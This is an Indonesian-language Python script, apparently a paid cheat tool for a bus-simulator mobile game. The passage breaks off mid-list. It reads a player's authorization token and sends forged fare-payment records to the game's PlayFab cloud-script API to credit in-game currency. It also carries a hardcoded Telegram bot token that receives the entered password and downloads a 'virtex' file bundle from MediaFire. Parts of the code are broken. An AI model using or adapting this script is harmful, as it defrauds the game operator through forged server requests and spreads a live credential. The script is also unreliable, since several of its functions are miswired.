# module
from os import system
from time import sleep
import sys, datetime
import os,sys,time
import requests, json, time, threading, os, sys
from colorama import Fore, init
import itertools
import random
import socket
import shutil
import webbrowser
import concurrent.futures


def countdownTimer(start_minute, start_second):
    total_second = start_minute * 60 + start_second
    while total_second:
        mins, secs = divmod(total_second, 60)
        time.sleep(1)
        total_second -= 1
    print("""\33[0;35m==========================""") 
    
 
# Config
red = Fore.LIGHTRED_EX
green = Fore.LIGHTGREEN_EX
yellow = Fore.LIGHTYELLOW_EX
blue = Fore.LIGHTBLUE_EX
white = Fore.WHITE
system("clear")

try:
  __import__('requests')
except ModuleNotFoundError:
  os.system ('pip3 install requests')
finally:
  import requests

try:
  __import__('bs4')
except ModuleNotFoundError:
  os.system ("pip3 install bs4")
finally:
  from bs4 import BeautifulSoup as parser

UPDATE = "10-11-2021 13:07"


print("""YOO SCRIPT""")

if 'linux' in sys.platform:
  r = "\033[91m" # Red
  g = "\033[92m" # Green
  y = "\033[93m" # Yellow
  p = "\033[94m" # Purple
  P = "\033[95m" # Pink
  c = "\033[96m" # Cyan
  w = "\033[97m" # White
  a = "\033[0m"  # Reset
else:
  # Convert String To Variabel Name
  for i in ['r','g','y','p','P','c','w','a']:
    globals()[i] = ""

try:
  print (f"{p}[{y}!{p}] {r}SUBSCRIBE yoo Games WOY")
  os.system("xdg-open  https://youtube.com/@fauzananugrah183?si=t_S9lX-UGQLu50JV")
  data = requests.get("https://www.mediafire.com/api/1.4/folder/get_content.php?content_type=files&filter=all&order_by=name&order_direction=asc&chunk=1&version=1.5&folder_key=ueti9cij4zf3i&response_format=json").json()
  files = data['response']['folder_content']['files']
except requests.exceptions.RequestException:
  exit(f"{p}[{y}!{p}] {r}Tidak Ada Koneksi!{a}")

colors = lambda : random.choice([r,g,y,p,P,c,w])

try:
  os.mkdir('virtex')
except FileExistsError:
  pass

def Moya(file):
   with requests.Session() as sesi:
     print (f"{p}[{y}!{p}] {y}Downloading {file['filename']}")
     a = sesi.get(file['links']['normal_download'])
     b = parser(a.content,'html.parser').find('a',class_ = 'popsok')['href']
     c = sesi.get(b).content
     d = os.path.join('virtex',file['filename'])
     e = os.open(d,os.O_CREAT | os.O_WRONLY)
     os.write(e,c)
     os.close(e)


def main():
  try:
    os.system ('clear')
 
   
    
    for khaneysia,rahmat in enumerate(files, start = 1):
      print (f"{p}[{r}{str(khaneysia).zfill(2)}{p}] {colors()}{os.path.splitext(rahmat['filename'])[0]}")
    print (f"{p}[{r}AL{p}] {c}UNDUH SEMUA VIRTEX\n{p}[{r}BA{p}] {y}KEMBALI KE MENU UTAMA\n{p}[{r}EX{p}] {r}KELUAR DARI PROGRAM")
    echa = input("%s>>>> %s" % (g,c)).lower()
    if echa == 'al':
      with concurrent.futures.ThreadPoolExecutor(15) as executor:
        executor.map(Moya, files)
      shutil.make_archive('virtex-master','zip','virtex')
      print (f"{p}[{g}â{p}] {g}Download Complete")
      exit (f"{p}[{g}â{p}] {g}Download Results Saved In : {os.path.realpath('virtex')}")
    elif echa == 'ba':
      menu()
    elif echa == 'ex':
      os.abort()
    elif int(echa) in range(1,len(files) + 1):
      rahmet = files[int(echa) - 1]
      kntl = 0
      print (f"{p}[{y}!{p}] {y}Downloading {rahmet['filename']}")
      while True:
        try:
          ses = requests.Session()
          req = ses.get(rahmet['links']['normal_download'])
          res = parser(req.content,'html.parser')
          print (f"{p}[{y}â{p}] {y}URL : {req.url}")
          print (f"{p}[{y}â{p}] {y}Status : {req.status_code}")
          url = res.find('a',class_ = 'popsok')['href']
          path = os.path.join('virtex',rahmet['filename'])
          file = os.open(path,os.O_CREAT | os.O_WRONLY)
          txt = ses.get(url).content
          os.write(file,txt)
          os.close(file)
          byte = os.stat(path).st_size
          for b in ['B','KB','MB','GB','TB']:
            if byte < 1024.0:
              byte = "%3.2f %s" % (byte,b)
              break
            else:
              byte /= 1024.0
          print (f"{p}[{y}â{p}] {g}File Name : {os.path.basename(path)}")
          print (f"{p}[{y}â{p}] {g}File Size : {byte}")
          print (f"{p}[{y}â{p}] {g}File Path : {os.path.realpath(path)}")
          show = input(f"{p}[{y}?{p}] {w}Lihat Hasil Download [{g}Y/{w}{r}n{w}] {P}").lower() == 'y'
          if show:
            os.system (f"xdg-open --view virtex/'{rahmet['filename']}'")
          time.sleep(1)
          main()
          break
        except requests.exceptions.RequestException as su:
          kntl += 1
          if kntl >= 5:
            print (f"{p}[{y}!{p}] {y}Gagal Terhubung Ke Server\n\n\tCoba :\n\t\tâ¢ Nonaktifkan mode pesawat\n\t\tâ¢ Aktifkan data seluler atau Wi-Fi\n\t\tâ¢ Periksa sinyal di area Anda{a}")
            break
          else:
            print (f"{p}[{y}!{p}] {y}Mencoba Menghubungkan ulang ke server")
            time.sleep(1.5)
    else:
      raise ValueError()

  except ValueError:
    print (f"{y}[!] Invalid Input!")
    time.sleep(1)
    main()

def menu():
  os.system('clear')
  
  #main()

if __name__ == "__main__":
  menu()

#///////////

logo = f"""\n
╔═════════════════════════════════════╗
║[\033[93m•\033[94m] \033[91m𝙽𝙾𝙼𝙾𝚁 0: \033[97mHACK UB 2 JUTA            \033[94m
║[\033[93m•\033[94m] \033[91m𝙽𝙾𝙼𝙾𝚁 1: \033[97mHACK UB 1 JUTA            \033[94m
║[\033[93m•\033[94m] \033[91m𝙽𝙾𝙼𝙾𝚁 2: \033[97mHACK UB 800K               \033[94m 
║[\033[93m•\033[94m] \033[91m𝙽𝙾𝙼𝙾𝚁 3: \033[97mHACK UB 500K              \033[94m  
║[\033[93m•\033[94m] \033[91m𝙽𝙾𝙼𝙾𝚁 4: \033[97mREDUCE -500K.             \033[94m  
╚═════════════════════════════════════╝
"""







done = False


def animate():
    for c in itertools.cycle(['ð', 'ð']):
        if done:
            break
        sys.stdout.write('\rloading ' + c)
        sys.stdout.flush()
        time.sleep(0.7)
    
   





 
def ketik():
  #os.system("cls||clear")
  gcg ="https://pastebin.com/raw/dEkvByFC"
  response = requests.get(gcg)
  tes1 = response.text
  gcg_1 = tes1
  gcg_2 = input(f'\n {red} MASUKKAN PASWORD PREM{white}:: ')
  if gcg_2 == gcg_1:  
      time.sleep(2)
      os.system("cls||clear")
      tesss = 'https://api.telegram.org/bot6818295661:AAE7yqAPyxlE-09Yck2EtxXon1vV9_9p5lk/sendMessage?parse_mode=markdown&chat_id=6609345348&text="{}"'.format(gcg_1)
      requests.get(tesss) 
  else:
       os.system("cls||clear")
       exit(f"{p}[{y}!{p}] {r} SCRIPT BERAKHIR SILAHKAN BELI DI  +62838-2507-1062 = yoo!{a}")
      
       
      # print(f" ")
       time.sleep(3)
       exit
ketik()
 
#nama = input(f"         NAMA:: ")

#base_url = 'https://api.telegram.org/bot6818295661:AAE7yqAPyxlE-09Yck2EtxXon1vV9_9p5lk/sendMessage?parse_mode=markdown&chat_id=6282628908&text="{}"'.format(nama)
#requests.get(base_url)
auth = input(f"\033[1;33;41m\033[1;37[X-Authorization\033[1;33m: \033[0m\033[")
#t = threading.Thread(target=animate)
#t.start()
#time.sleep(10)
#done = True
#menu 
#for joke in auth:

def login():
    system("clear")
    ketik(c)





record = [{'Key': {'sourceCity': 'BKL', 'destinationCity': 'SBY', 'routePassed': ['SBY', 'BKL'], 'activityRewards': None}, 'Value': 40},{'Key': {'sourceCity': 'SBY', 'destinationCity': 'SMG', 'routePassed': ['SMG', 'SBY'], 'activityRewards': None}, 'Value': 60},{'Key': {'sourceCity': 'BKL', 'destinationCity': 'SMG', 'routePassed': ['SMG', 'BKL'], 'activityRewards': None}, 'Value': 20},{'Key': {'sourceCity': 'SMG', 'destinationCity': 'CBN', 'routePassed': ['CBN', 'SMG'], 'activityRewards': None}, 'Value': 60},{'Key': {'sourceCity': 'SBY', 'destinationCity': 'CBN', 'routePassed': ['CBN', 'SBY'], 'activityRewards': None}, 'Value': 13},{'Key': {'sourceCity': 'BKL', 'destinationCity': 'CBN', 'routePassed': ['CBN', 'BKL'], 'activityRewards': None}, 'Value': 5},{'Key': {'sourceCity': 'CBN', 'destinationCity': 'JKT', 'routePassed': ['JKT', 'CBN'], 'activityRewards': None}, 'Value': 45},{'Key': {'sourceCity': 'SMG', 'destinationCity': 'JKT', 'routePassed': ['JKT', 'SMG'], 'activityRewards': None}, 'Value': 9},{'Key': {'sourceCity': 'SBY', 'destinationCity': 'JKT', 'routePassed': ['JKT', 'SBY'], 'activityRewards': None}, 'Value': 5},{'Key': {'sourceCity': 'JKT', 'destinationCity': 'BKL', 'routePassed': ['BKL', 'JKT'], 'activityRewards': None}, 'Value': 6},{'Key': {'sourceCity': 'JKT', 'destinationCity': 'P_Merak', 'routePassed': ['P_Merak', 'JKT'], 'activityRewards': None}, 'Value': 45},{'Key': {'sourceCity': 'CBN', 'destinationCity': 'P_Merak', 'routePassed': ['P_Merak', 'CBN'], 'activityRewards': None}, 'Value': 9},{'Key': {'sourceCity': 'SMG', 'destinationCity': 'P_Merak', 'routePassed': ['P_Merak', 'SMG'], 'activityRewards': None}, 'Value': 5},{'Key': {'sourceCity': 'SBY', 'destinationCity': 'P_Merak', 'routePassed': ['P_Merak', 'SBY'], 'activityRewards': None}, 'Value': 6},{'Key': {'sourceCity': 'BKL', 'destinationCity': 'P_Merak', 'routePassed': ['P_Merak', 'BKL'], 'activityRewards': None}, 'Value': 6},{'Key': {'sourceCity': 'P_Merak', 'destinationCity': 'P_Bakauheni', 'routePassed': ['P_Bakauheni', 'P_Merak'], 'activityRewards': None}, 'Value': 5}, {'Key': {'sourceCity': 'JKT', 'destinationCity': 'P_Bakauheni', 'routePassed': ['P_Bakauheni', 'JKT'], 'activityRewards': None}, 'Value': 1},{'Key': {'sourceCity': 'CBN', 'destinationCity': 'P_Bakauheni', 'routePassed': ['P_Bakauheni', 'CBN'], 'activityRewards': None}, 'Value': 1},{'Key': {'sourceCity': 'SMG', 'destinationCity': 'P_Bakauheni', 'routePassed': ['P_Bakauheni', 'SMG'], 'activityRewards': None}, 'Value': 0},{'Key': {'sourceCity': 'SBY', 'destinationCity': 'P_Bakauheni', 'routePassed': ['P_Bakauheni', 'SBY'], 'activityRewards': None}, 'Value': 0},{'Key': {'sourceCity': 'BKL', 'destinationCity': 'P_Bakauheni', 'routePassed': ['P_Bakauheni', 'BKL'], 'activityRewards': None}, 'Value': 0},{'Key': {'sourceCity': 'P_Merak', 'destinationCity': 'LPG', 'routePassed': ['LPG', 'P_Merak'], 'activityRewards': None}, 'Value': 4},{'Key': {'sourceCity': 'JKT', 'destinationCity': 'LPG', 'routePassed': ['LPG', 'JKT'], 'activityRewards': None}, 'Value': 6},{'Key': {'sourceCity': 'CBN', 'destinationCity': 'LPG', 'routePassed': ['LPG', 'CBN'], 'activityRewards': None}, 'Value': 1},{'Key': {'sourceCity': 'SMG', 'destinationCity': 'LPG', 'routePassed': ['LPG', 'SMG'], 'activityRewards': None}, 'Value': 1},{'Key': {'sourceCity': 'SBY', 'destinationCity': 'LPG', 'routePassed': ['LPG', 'SBY'], 'activityRewards': None}, 'Value': 1},{'Key': {'sourceCity': 'BKL', 'destinationCity': 'LPG', 'routePassed': ['LPG', 'BKL'], 'activityRewards': None}, 'Value': 1},{'Key': {'sourceCity': 'LPG', 'destinationCity': 'PLB', 'routePassed': ['LPG', 'SBY'], 'activityRewards': None}, 'Value': 55},{'Key': {'sourceCity': 'P_Bakauheni', 'destinationCity': 'PLB', 'routePassed': ['PLB', 'P_Bakauheni'], 'activityRewards': None}, 'Value': 11},{'Key': {'sourceCity': 'P_Merak', 'destinationCity': 'PLB', 'routePassed': ['PLB', 'P_Merak'], 'activityRewards': None}, 'Value': 6},{'Key': {'sourceCity': 'JKT', 'destinationCity': 'PLB', 'routePassed': ['PLB', 'JKT'], 'activityRewards': None}, 'Value': 4},{'Key': {'sourceCity': 'CBN', 'destinationCity': 'PLB', 'routePassed': ['PLB', 'CBN'], 'activityRewards': None}, 'Value': 6},{'Key': {'sourceCity': 'SMG', 'destinationCity': 'PLB', 'routePassed': ['PLB', 'SMG'], 'activityRewards': None}, 'Value': 6},{'Key': {'sourceCity': 'SBY', 'destinationCity': 'PLB', 'routePassed': ['PLB', 'SBY'], 'activityRewards': None}, 'Value': 6},{'Key': {'sourceCity': 'BKL', 'destinationCity': 'PLB', 'routePassed': ['PLB', 'BKL'], 'activityRewards': None}, 'Value': 6},{'Key': {'sourceCity': 'PLB', 'destinationCity': 'JMB', 'routePassed': ['JMB', 'PLB'], 'activityRewards': None}, 'Value': 60},{'Key': {'sourceCity': 'LPG', 'destinationCity': 'JMB', 'routePassed': ['JMB', 'LPG'], 'activityRewards': None}, 'Value': 10},{'Key': {'sourceCity': 'P_Bakauheni', 'destinationCity': 'JMB', 'routePassed': ['JMB', 'P_Bakauheni'], 'activityRewards': None}, 'Value': 5},{'Key': {'sourceCity': 'P_Merak', 'destinationCity': 'JMB', 'routePassed': ['JMB', 'P_Merak'], 'activityRewards': None}, 'Value': 6},{'Key': {'sourceCity': 'JKT', 'destinationCity': 'JMB', 'routePassed': ['JMB', 'JKT'], 'activityRewards': None}, 'Value': 6},{'Key': {'sourceCity': 'CBN', 'destinationCity': 'JMB', 'routePassed': ['JMB', 'CBN'], 'activityRewards': None}, 'Value': 6},{'Key': {'sourceCity': 'SMG', 'destinationCity': 'JMB', 'routePassed': ['JMB', 'SMG'], 'activityRewards': None}, 'Value': 6},{'Key': {'sourceCity': 'SBY', 'destinationCity': 'JMB', 'routePassed': ['JMB', 'SBY'], 'activityRewards': None}, 'Value': 1},{'Key': {'sourceCity': 'BKL', 'destinationCity': 'JMB', 'routePassed': ['JMB', 'BKL'], 'activityRewards': None}, 'Value': 1},{'Key': {'sourceCity': 'JMB', 'destinationCity': 'PBR', 'routePassed': ['PBR', 'JMB'], 'activityRewards': None}, 'Value': 60},{'Key': {'sourceCity': 'PLB', 'destinationCity': 'PBR', 'routePassed': ['PBR', 'PLB'], 'activityRewards': None}, 'Value': 12},{'Key': {'sourceCity': 'LPG', 'destinationCity': 'PBR', 'routePassed': ['PBR', 'LPG'], 'activityRewards': None}, 'Value': 6},{'Key': {'sourceCity': 'P_Bakauheni', 'destinationCity': 'PBR', 'routePassed': ['PBR', 'P_Bakauheni'], 'activityRewards': None}, 'Value': 4},{'Key': {'sourceCity': 'P_Merak', 'destinationCity': 'PBR', 'routePassed': ['PBR', 'P_Merak'], 'activityRewards': None}, 'Value': 6},{'Key': {'sourceCity': 'JKT', 'destinationCity': 'PBR', 'routePassed': ['PBR', 'JKT'], 'activityRewards': None}, 'Value': 6},{'Key': {'sourceCity': 'CBN', 'destinationCity': 'PBR', 'routePassed': ['PBR', 'CBN'], 'activityRewards': None}, 'Value': 6},{'Key': {'sourceCity': 'SMG', 'destinationCity': 'PBR', 'routePassed': ['PBR', 'SMG'], 'activityRewards': None}, 'Value': 6},{'Key': {'sourceCity': 'SBY', 'destinationCity': 'PBR', 'routePassed': ['PBR', 'SBY'], 'activityRewards': None}, 'Value': 6},{'Key': {'sourceCity': 'BKL', 'destinationCity': 'PBR', 'routePassed': ['PBR', 'BKL'], 'activityRewards': None}, 'Value': 1},{"Key":{"sourceCity":"PBR","destinationCity":"BKT","routePassed":["BKT","PBR"],"activityRewards":None},"Value":50},{"Key":{"sourceCity":"PBR","destinationCity":"PDG","routePassed":["PDG","BKT","PBR"],"activityRewards":None},"Value":9},{"Key":{"sourceCity":"BKT","destinationCity":"PDG","routePassed":["PDG","BKT"],"activityRewards":None},"Value":50},]            




                                
headers = {'User-Agent': 'UnityEngine-Unity; Version: 2018.4.26f1','X-ReportErrorAsSuccess': 'true','X-PlayFabSDK': 'UnitySDK-2.20.170411','X-Authorization': '','Content-Type': 'application/json','Content-Length': '223','Host': '4ae9.playfabapi.com'}

def mxxxx():
	data = json.dumps({"PlayFabId":None,"InfoRequestParameters":{"GetUserAccountInfo":True,"GetUserInventory":True,"GetUserVirtualCurrency":True,"GetUserData":False,"UserDataKeys":None,"GetUserReadOnlyData":True,"UserReadOnlyDataKeys":None,"GetCharacterInventories":False,"GetCharacterList":False,"GetTitleData":True,"TitleDataKeys":None,"GetPlayerStatistics":False,"PlayerStatisticNames":None}})
	response = requests.post('https://4ae9.playfabapi.com/Client/GetPlayerCombinedInfo', headers=headers, data=data).text
	if response != '':
		parser = json.loads(response)
		if parser['code'] == 401:
			pass
		elif parser['code'] == 200:
			backend_data = parser['data']
			if "apiError" in str(backend_data):
				pass
			else:
				chat = backend_data['InfoResultPayload']
				uang= chat['UserVirtualCurrency']
				money= uang['RP']
				
				fff= chat['AccountInfo']
				zzz= fff['TitleInfo']
				www= zzz['TitlePlayerAccount']
				saa= www['Id']
				
				gcc= chat['AccountInfo']
				id= gcc['TitleInfo']
				you= id['DisplayName']
				ketik(f"{red}╔═══════════════\033[1;33;41m • \033[1;37[ 𝙸𝙽𝙵𝙾 𝙰𝙺𝚄𝙽 \033[1;33m• \033[0m\033[{white}═════════════════╗")
				ketik(f"{red} {white} - Total_Money: {green}{money}   {white}                    ")
				ketik(f"{red} {white} - Id_Kamu: {green}{saa}               {white}     ")
				ketik(f"{white}╚═════════════════════ - {red}════════════════════════╝")	
				


def create_ff():
	game_data = '{"FunctionName":"PlayCareer","FunctionParameter":{"cities":["BKL","SBY","SMG","CBN","JKT","P_Merak","P_Bakauheni","LPG","PLB","JMB","PBR","BKT","PDG"]},"RevisionSelection":"Live","SpecificRevision":null,"GeneratePlayStreamEvent":false}'
	response = requests.post('https://4ae9.playfabapi.com/Client/ExecuteCloudScript', headers=headers, data=game_data).text
	if response != '':
		parser = json.loads(response)
		if parser['code'] == 401:
			return None
		elif parser['code'] == 200:
			data = parser['data']
			if "apiError" in str(data):
				return None
			else:
				carrer = data['FunctionResult']['careerSession']
				return carrer
	else:
		return None

def skip_mll(token):
	data = json.dumps({"FunctionName":"FarePayment","FunctionParameter":{"records":record,"bonus":True,"careerToken":token,"activityRewardToken":"{\"rewards\":[]}"},"RevisionSelection":"Live","SpecificRevision":None,"GeneratePlayStreamEvent":False})
	response = requests.post('https://4ae9.playfabapi.com/Client/ExecuteCloudScript', headers=headers, data=data).text
	if response != '':
		parser = json.loads(response)
		if parser['code'] == 401:
			pass
		elif parser['code'] == 200:
			backend_data = parser['data']
			if "apiError" in str(backend_data):
				pass
			else:
				logs = backend_data['FunctionResult']
				
def pass_missyu():
	carrer = create_ff()
	if carrer != None:	
		token = carrer['token']
		skip_mll(token)
		mxxxx()
		
headers['X-Authorization'] = auth





def create_mission():
	game_data = '{"FunctionName":"PlayCareer","FunctionParameter":{"cities":["BKL","SBY","SMG","CBN","JKT","P_Merak","P_Bakauheni","LPG","PLB","JMB","PBR","BKT","PDG"]},"RevisionSelection":"Live","SpecificRevision":null,"GeneratePlayStreamEvent":false}'
	response = requests.post('https://4ae9.playfabapi.com/Client/ExecuteCloudScript', headers=headers, data=game_data).text
	if response != '':
		parser = json.loads(response)
		if parser['code'] == 401:
			return None
		elif parser['code'] == 200:
			data = parser['data']
			if "apiError" in str(data):
				return None
			else:
				carrer = data['FunctionResult']['careerSession']
				return carrer
	else:
		return None

def skip_mission(token):
	data = json.dumps({"FunctionName":"FarePayment","FunctionParameter":{"records":record,"bonus":True,"careerToken":token,"activityRewardToken":"{\"rewards\":[]}"},"RevisionSelection":"Live","SpecificRevision":None,"GeneratePlayStreamEvent":False})
	response = requests.post('https://4ae9.playfabapi.com/Client/ExecuteCloudScript', headers=headers, data=data).text
	if response != '':
		parser = json.loads(response)
		if parser['code'] == 401:
			pass
		elif parser['code'] == 200:
			backend_data = parser['data']
			if "apiError" in str(backend_data):
				pass
			else:
				logs = backend_data['FunctionResult']
				
				

def pass_mission():
	carrer = create_mission()
	if carrer != None:	
		token = carrer['token']
		skip_mission(token)
		mxxxx()
		
headers['X-Authorization'] = auth






def create_peta():
	game_data = '{"FunctionName":"PlayCareer","FunctionParameter":{"cities":["BKL","SBY","SMG","CBN","JKT","P_Merak","P_Bakauheni","LPG","PLB","JMB","PBR","BKT","PDG"]},"RevisionSelection":"Live","SpecificRevision":null,"GeneratePlayStreamEvent":false}'
	response = requests.post('https://4ae9.playfabapi.com/Client/ExecuteCloudScript', headers=headers, data=game_data).text
	if response != '':
		parser = json.loads(response)
		if parser['code'] == 401:
			return None
		elif parser['code'] == 200:
			data = parser['data']
			if "apiError" in str(data):
				return None
			else:
				carrer = data['FunctionResult']['careerSession']
				return carrer
	else:
		return None

def skip_mep(token):
	data = json.dumps({"FunctionName":"FarePayment","FunctionParameter":{"records":record,"bonus":True,"careerToken":token,"activityRewardToken":"{\"rewards\":[]}"},"RevisionSelection":"Live","SpecificRevision":None,"GeneratePlayStreamEvent":False})
	response = requests.post('https://4ae9.playfabapi.com/Client/ExecuteCloudScript', headers=headers, data=data).text
	if response != '':
		parser = json.loads(response)
		if parser['code'] == 401:
			pass
		elif parser['code'] == 200:
			backend_data = parser['data']
			if "apiError" in str(backend_data):
				pass
			else:
				logs = backend_data['FunctionResult']
				
def pass_sukses():
	carrer = create_peta()
	if carrer != None:	
		token = carrer['token']
		skip_mep(token)
		
		
headers['X-Authorization'] = auth




def skip_missionnnnn():
	data = json.dumps({"FunctionName":"RewardProcess","FunctionParameter":None,"RevisionSelection":"Live","SpecificRevision":None,"GeneratePlayStreamEvent":False})
	response = requests.post('https://4ae9.playfabapi.com/Client/ExecuteCloudScript', headers=headers, data=data).text
	if response != '':
		parser = json.loads(response)
		if parser['code'] == 401:
			pass
		elif parser['code'] == 200:
			backend_data = parser['data']
			if "apiError" in str(backend_data):
				pass
			else:
				logs = backend_data['FunctionResult']
				


headers['X-Authorization'] = auth



#bagian 2
#500 k
def create_missionn():
	game_data = '{"FunctionName":"PlayCareer","FunctionParameter":{"cities":["BKL","SBY","SMG","CBN","JKT","P_Merak","P_Bakauheni","LPG","PLB","JMB","PBR","BKT","PDG"]},"RevisionSelection":"Live","SpecificRevision":null,"GeneratePlayStreamEvent":false}'
	response = requests.post('https://4ae9.playfabapi.com/Client/ExecuteCloudScript', headers=headers, data=game_data).text
	if response != '':
		parser = json.loads(response)
		if parser['code'] == 401:
			return None
		elif parser['code'] == 200:
			data = parser['data']
			if "apiError" in str(data):
				return None
			else:
				carrer = data['FunctionResult']['careerSession']
				return carrer
	else:
		return None

def skip_missionn(token):
	data = json.dumps({"FunctionName":"FarePayment","FunctionParameter":{"records":record,"bonus":False,"careerToken":token,"activityRewardToken":"{\"rewards\":[]}"},"RevisionSelection":"Live","SpecificRevision":None,"GeneratePlayStreamEvent":False})
	response = requests.post('https://4ae9.playfabapi.com/Client/ExecuteCloudScript', headers=headers, data=data).text
	if response != '':
		parser = json.loads(response)
		if parser['code'] == 401:
			pass
		elif parser['code'] == 200:
			backend_data = parser['data']
			if "apiError" in str(backend_data):
				pass
			else:
				logs = backend_data['FunctionResult']
				
def pass_scs():
	carrer = create_missionn()
	if carrer != None:	
		token = carrer['token']
		skip_missionn(token)
		mxxxx()
		
headers['X-Authorization'] = auth

		
def rename():
	data = json.dumps({"DisplayName":"Top Up Tes"})
	response = requests.post('https://4ae9.playfabapi.com/Client/UpdateUserTitleDisplayName', headers=headers, data=data).text
	if response != '':
		parser = json.loads(response)
		if parser['code'] == 401:
			pass
		elif parser['code'] == 200:
			backend_data = parser['data']
			if "apiError" in str(backend_data):
				pass
			else:
				chat = backend_data['DisplayName']
				
			
				
#800k
recordd = [{'Key': {'sourceCity': 'BKL', 'destinationCity': 'SBY', 'routePassed': ['SBY', 'BKL'], 'activityRewards': None}, 'Value': 40},{'Key': {'sourceCity': 'SBY', 'destinationCity': 'SMG', 'routePassed': ['SMG', 'SBY'], 'activityRewards': None}, 'Value': 60},{'Key': {'sourceCity': 'BKL', 'destinationCity': 'SMG', 'routePassed': ['SMG', 'BKL'], 'activityRewards': None}, 'Value': 12},{'Key': {'sourceCity': 'SMG', 'destinationCity': 'CBN', 'routePassed': ['CBN', 'SMG'], 'activityRewards': None}, 'Value': 50},{'Key': {'sourceCity': 'SBY', 'destinationCity': 'CBN', 'routePassed': ['CBN', 'SBY'], 'activityRewards': None}, 'Value': 10},{'Key': {'sourceCity': 'BKL', 'destinationCity': 'CBN', 'routePassed': ['CBN', 'BKL'], 'activityRewards': None}, 'Value': 5},{'Key': {'sourceCity': 'CBN', 'destinationCity': 'JKT', 'routePassed': ['JKT', 'CBN'], 'activityRewards': None}, 'Value': 45},{'Key': {'sourceCity': 'SMG', 'destinationCity': 'JKT', 'routePassed': ['JKT', 'SMG'], 'activityRewards': None}, 'Value': 9},{'Key': {'sourceCity': 'SBY', 'destinationCity': 'JKT', 'routePassed': ['JKT', 'SBY'], 'activityRewards': None}, 'Value': 5},{'Key': {'sourceCity': 'JKT', 'destinationCity': 'BKL', 'routePassed': ['BKL', 'JKT'], 'activityRewards': None}, 'Value': 3},{'Key': {'sourceCity': 'JKT', 'destinationCity': 'P_Merak', 'routePassed': ['P_Merak', 'JKT'], 'activityRewards': None}, 'Value': 45},{'Key': {'sourceCity': 'CBN', 'destinationCity': 'P_Merak', 'routePassed': ['P_Merak', 'CBN'], 'activityRewards': None}, 'Value': 9},{'Key': {'sourceCity': 'SMG', 'destinationCity': 'P_Merak', 'routePassed': ['P_Merak', 'SMG'], 'activityRewards': None}, 'Value': 5},{'Key': {'sourceCity': 'SBY', 'destinationCity': 'P_Merak', 'routePassed': ['P_Merak', 'SBY'], 'activityRewards': None}, 'Value': 3},{'Key': {'sourceCity': 'BKL', 'destinationCity': 'P_Merak', 'routePassed': ['P_Merak', 'BKL'], 'activityRewards': None}, 'Value': 2},{'Key': {'sourceCity': 'P_Merak', 'destinationCity': 'P_Bakauheni', 'routePassed': ['P_Bakauheni', 'P_Merak'], 'activityRewards': None}, 'Value': 5}, {'Key': {'sourceCity': 'JKT', 'destinationCity': 'P_Bakauheni', 'routePassed': ['P_Bakauheni', 'JKT'], 'activityRewards': None}, 'Value': 1},{'Key': {'sourceCity': 'CBN', 'destinationCity': 'P_Bakauheni', 'routePassed': ['P_Bakauheni', 'CBN'], 'activityRewards': None}, 'Value': 1},{'Key': {'sourceCity': 'SMG', 'destinationCity': 'P_Bakauheni', 'routePassed': ['P_Bakauheni', 'SMG'], 'activityRewards': None}, 'Value': 0},{'Key': {'sourceCity': 'SBY', 'destinationCity': 'P_Bakauheni', 'routePassed': ['P_Bakauheni', 'SBY'], 'activityRewards': None}, 'Value': 0},{'Key': {'sourceCity': 'BKL', 'destinationCity': 'P_Bakauheni', 'routePassed': ['P_Bakauheni', 'BKL'], 'activityRewards': None}, 'Value': 0},{'Key': {'sourceCity': 'P_Merak', 'destinationCity': 'LPG', 'routePassed': ['LPG', 'P_Merak'], 'activityRewards': None}, 'Value': 4},{'Key': {'sourceCity': 'JKT', 'destinationCity': 'LPG', 'routePassed': ['LPG', 'JKT'], 'activityRewards': None}, 'Value': 2},{'Key': {'sourceCity': 'CBN', 'destinationCity': 'LPG', 'routePassed': ['LPG', 'CBN'], 'activityRewards': None}, 'Value': 1},{'Key': {'sourceCity': 'SMG', 'destinationCity': 'LPG', 'routePassed': ['LPG', 'SMG'], 'activityRewards': None}, 'Value': 1},{'Key': {'sourceCity': 'SBY', 'destinationCity': 'LPG', 'routePassed': ['LPG', 'SBY'], 'activityRewards': None}, 'Value': 1},{'Key': {'sourceCity': 'BKL', 'destinationCity': 'LPG', 'routePassed': ['LPG', 'BKL'], 'activityRewards': None}, 'Value': 1},{'Key': {'sourceCity': 'LPG', 'destinationCity': 'PLB', 'routePassed': ['LPG', 'SBY'], 'activityRewards': None}, 'Value': 55},{'Key': {'sourceCity': 'P_Bakauheni', 'destinationCity': 'PLB', 'routePassed': ['PLB', 'P_Bakauheni'], 'activityRewards': None}, 'Value': 11},{'Key': {'sourceCity': 'P_Merak', 'destinationCity': 'PLB', 'routePassed': ['PLB', 'P_Merak'], 'activityRewards': None}, 'Value': 6},{'Key': {'sourceCity': 'JKT', 'destinationCity': 'PLB', 'routePassed': ['PLB', 'JKT'], 'activityRewards': None}, 'Value': 4},{'Key': {'sourceCity': 'CBN', 'destinationCity': 'PLB', 'routePassed': ['PLB', 'CBN'], 'activityRewards': None}, 'Value': 3},{'Key': {'sourceCity': 'SMG', 'destinationCity': 'PLB', 'routePassed': ['PLB', 'SMG'], 'activityRewards': None}, 'Value': 2},{'Key': {'sourceCity': 'SBY', 'destinationCity': 'PLB', 'routePassed': ['PLB', 'SBY'], 'activityRewards': None}, 'Value': 2},{'Key': {'sourceCity': 'BKL', 'destinationCity': 'PLB', 'routePassed': ['PLB', 'BKL'], 'activityRewards': None}, 'Value': 2},{'Key': {'sourceCity': 'PLB', 'destinationCity': 'JMB', 'routePassed': ['JMB', 'PLB'], 'activityRewards': None}, 'Value': 50},{'Key': {'sourceCity': 'LPG', 'destinationCity': 'JMB', 'routePassed': ['JMB', 'LPG'], 'activityRewards': None}, 'Value': 10},{'Key': {'sourceCity': 'P_Bakauheni', 'destinationCity': 'JMB', 'routePassed': ['JMB', 'P_Bakauheni'], 'activityRewards': None}, 'Value': 5},{'Key': {'sourceCity': 'P_Merak', 'destinationCity': 'JMB', 'routePassed': ['JMB', 'P_Merak'], 'activityRewards': None}, 'Value': 3},{'Key': {'sourceCity': 'JKT', 'destinationCity': 'JMB', 'routePassed': ['JMB', 'JKT'], 'activityRewards': None}, 'Value': 3},{'Key': {'sourceCity': 'CBN', 'destinationCity': 'JMB', 'routePassed': ['JMB', 'CBN'], 'activityRewards': None}, 'Value': 2},{'Key': {'sourceCity': 'SMG', 'destinationCity': 'JMB', 'routePassed': ['JMB', 'SMG'], 'activityRewards': None}, 'Value': 2},{'Key': {'sourceCity': 'SBY', 'destinationCity': 'JMB', 'routePassed': ['JMB', 'SBY'], 'activityRewards': None}, 'Value': 1},{'Key': 